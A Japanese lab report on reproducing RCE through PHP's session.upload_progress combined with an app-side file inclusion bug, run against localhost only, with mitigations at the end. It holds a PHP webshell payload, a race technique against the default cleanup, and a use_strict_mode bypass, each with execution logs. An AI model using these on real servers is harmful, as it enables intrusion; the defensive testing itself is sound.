# PHP2SHELL ローカル検証レポート

- 実施: 2026-10-21 17:49 JST
- 環境: Docker Desktop 29.7.2 / macOS 25.5.0 arm64
- 対象: 自分専用のローカルラボ（`127.0.0.1` のみ）
- 閲覧用 HTML: [`index.html`](index.html)
- 生ログ: [`evidence/`](evidence/)
- 再実行: `./report/run_repro.sh`

> 本レポートは、公開情報の「PHP コア UAF」と、`session.upload_progress` +
> アプリ側 LFI の既知の鎖を分けて検証したものです。後者はラボ内の
> **意図的に脆弱な LFI アプリ**で再現しています。公開 PoC のコア UAF は
> 本ラボでは再現していません。外部システムには送信していません。

## 判定サマリ

| 検証項目 | 結果 |
| --- | --- |
| 公開 PoC 618/619（PHP 8.4.4 ASAN） | 再現せず |
| 258B trigger の進捗ストア経路 | 到達（`bytes_processed=258`） |
| `session.upload_progress` + LFI（`cleanup=0`） | **RCE 成功** |
| `cleanup=1`（既定）のレース | **3/3 成功** |
| `enabled=0` + 一時ファイル include | **RCE 成功** |
| `use_strict_mode=1`（攻撃者指定 SID） | 失敗 |
| `use_strict_mode=1` + `Set-Cookie` 追従 | **RCE 成功** |
| mod_php (Apache) | **RCE 成功** |
| ASAN レポート | なし |

「RCE 成功」は、ラボ内で `id` が実行され `uid=33(www-data)` が返ったことを意味します。

## 1. 検証環境

```text
PHP 8.4.4 (cli)  ASAN build, USE_ZEND_ALLOC=0
PHP 8.4.4 (fpm-fcgi) / nginx 1.31.7
PHP 5.6.40 (fpm-fcgi)
php:8.4.4-apache (mod_php) on 8091
```

| ポート | 用途 |
| --- | --- |
| 8080 | `session.upload_progress=1`（ASAN） |
| 8081 | `session.upload_progress=0`（ASAN） |
| 8083 | PHP 5.6.40 |
| 8087 | LFI + `cleanup=0` |
| 8088 | LFI + `cleanup=1`（レース） |
| 8089 | LFI + `enabled=0`（一時ファイル include） |
| 8090 | LFI + `use_strict_mode=1` |
| 8091 | mod_php (Apache) |

## 2. 攻撃チェーン（ソース）

1. `main/rfc1867.c` の `MULTIPART_EVENT_FORMDATA` が
   `PHP_SESSION_UPLOAD_PROGRESS` の値を `event_formdata.value` として渡す。
2. `ext/session/session.c` の `php_session_rfc1867_callback()` が
   `progress->key = "upload_progress_" + 値` を作る。
3. `php_session_rfc1867_update()` が `php_session_initialize()` →
   `zend_hash_update()` を実行し、**アプリのスクリプトが動く前**に
   `sess_<PHPSESSID>` へシリアライズして書き込む。
4. `php_session_rfc1867_early_find_sid()` は Cookie/GET の `PHPSESSID` を先に読む。
5. LFI が `sess_<id>` を include すると、シリアライズされたキー文字列内の
   `<?php ... ?>` が実行される。

## 3. 実験1: `cleanup=0` の LFI

```text
[*] upload http://127.0.0.1:8087/index.php sid=lfi...
[*] payload=<?php system($_GET[0]);?>
[*] upload status=200
[*] include /tmp/sess_lfi...
[*] lfi status=200 bytes=396
upload_progress_uid=33(www-data) gid=33(www-data) groups=33(www-data)
|a:5:{s:10:"start_time";...}
[*] command output present: True
```

セッションファイルの実体:

```text
upload_progress_<?php system($_GET[0]);?>|a:5:{s:10:"start_time";...}
```

## 4. 実験2: `cleanup=1`（既定）のレース

FPM の `FILLUNIT=5120` を満たす初回チャンク（6000B）を送り、1.5 秒 stall。
その間に LFI を繰り返しました。

```text
[*] attempt 1/3
[+] sid=race... hit: upload_progress_uid=33(www-data) ...
[*] attempt 2/3
[+] sid=race... hit: upload_progress_uid=33(www-data) ...
[*] attempt 3/3
[+] sid=race... hit: upload_progress_uid=33(www-data) ...
[*] wins=3/3
```

**既定の `cleanup=1` だけでは防げません。**

## 5. 実験3: `enabled=0` + 一時ファイル include

```text
[*] target=http://127.0.0.1:8089/temp.php status=200 bytes=54
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[*] command output present: True
```

`enabled=0` はセッション書き込みを止めますが、multipart のアップロードと
`$_FILES['f']['tmp_name']` は残ります。アプリがそれを include すると RCE です。

## 6. 実験4: `use_strict_mode=1`

攻撃者指定 SID では失敗:

```text
Warning: include(/tmp/sess_lfi...): Failed to open stream: No such file or directory
[*] command output present: False
```

しかしアップロード応答の `Set-Cookie` には新しい SID が入ります。
応答を読める状況では、その SID で成立します。

```text
[*] followed Set-Cookie PHPSESSID=...
[*] include /tmp/sess_...
upload_progress_uid=33(www-data) ...
[*] command output present: True
```

## 7. 実験5: mod_php (Apache)

```text
[*] upload http://127.0.0.1:8091/index.php ...
[*] lfi status=200 bytes=396
upload_progress_uid=33(www-data) ...
[*] command output present: True
```

Apache access log:

```text
"POST /index.php HTTP/1.1" 200
"GET /index.php?file=%2Ftmp%2Fsess_...&0=id HTTP/1.1" 200 618
```

## 8. 公開 PoC 618/619（コア UAF）は再現せず

```text
[probe:vuln]      status=200 upload_progress=present
[probe:mitigated] status=200 upload_progress=absent file_parsed=True
[trigger-single]  status=200 bytes_processed=258 done=True asan=no
[poc618]          status=200 resp=467B rce=no asan=no failure=no
[poc619]          status=200 resp=357B rce=no asan=no failure=no
RESULT: no RCE or sanitizer report in this run
```

8.5.4 ASAN、5.6.40、ASLR 無効 + 実 call アドレス、毒 call アドレスでも同様でした。
公開バンドル自身の `VALIDATION.md` も「ASAN crash はローカルで未観測」と明記しています。
今回の LFI 鎖は、コア UAF とは別の、アプリ側 LFI を必要とする経路です。

## 9. 通信ログ（nginx access log 抜粋）

```text
"POST /index.php HTTP/1.1" 200 5 "-" "-"
"GET /index.php?file=%2Ftmp%2Fsess_lfi...&0=id HTTP/1.1" 200 414 "-" "-"
"POST /index.php HTTP/1.1" 200 5 "-" "-"
"GET /index.php?file=%2Ftmp%2Fsess_race...&0=id HTTP/1.1" 200 387 "-" "-"
"POST /temp.php?0=id HTTP/1.1" 200 65 "-" "-"
```

完全版: [`evidence/08_nginx_access.log`](evidence/08_nginx_access.log)

## 10. 対策と限界

- **`session.upload_progress.enabled=Off`** が、この session 書き込み primitive に最も強い対策。
- **`cleanup=1`** は終了時に消すだけで、アップロード中のレースには耐えない。
- **`use_strict_mode=1`** は SID を選ばせないだけで、progress の書き込みは続く。
  応答の `Set-Cookie` を読める状況では回避される。
- **`enabled=0` でも multipart の一時ファイルは作られる**。アプリがアップロードファイルを
  include する sink を持つ場合は別途遮断が必要。
- 本レポートの LFI 鎖は、**アプリ側に LFI（またはセッションファイルを読む sink）**
  があることが前提です。PHP コアだけで万能に RCE になる、という主張ではありません。
- 公開 PoC のコア UAF / 公式 CVE の原因は、公式パッチ公開後に差分を確認する必要があります。

## 11. 証跡

- `evidence/00_env.txt` — 環境・バージョン
- `evidence/01_public_poc.txt` — 公開 PoC（UAF 未再現）
- `evidence/02_lfi_cleanup0.txt` — cleanup=0
- `evidence/03_race_cleanup1.txt` — cleanup=1 レース
- `evidence/04_enabled0_temp_include.txt` — enabled=0 + temp include
- `evidence/05_strict_chosen_sid.txt` / `06_strict_follow_cookie.txt`
- `evidence/07_modphp.txt`
- `evidence/08_nginx_access.log`
- `evidence/09_session_files_vuln.txt`
- `evidence/12_apache_access.log`
- `evidence/13_asan_check.txt`

---

本レポートは自分専用の隔離ラボでの防御・検証を目的としたものであり、外部システムへの攻撃を意図しません。
